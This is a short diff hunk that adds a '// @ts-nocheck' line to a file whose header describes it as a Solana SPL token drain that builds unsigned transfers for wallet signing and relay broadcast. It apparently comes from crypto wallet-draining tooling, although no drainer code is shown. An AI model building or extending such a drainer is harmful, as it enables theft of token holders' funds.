@@ -1,3 +1,4 @@
+// @ts-nocheck
 /**
  * Solana SPL token drain — unsigned transfer for wallet signing + relay broadcast.
  */
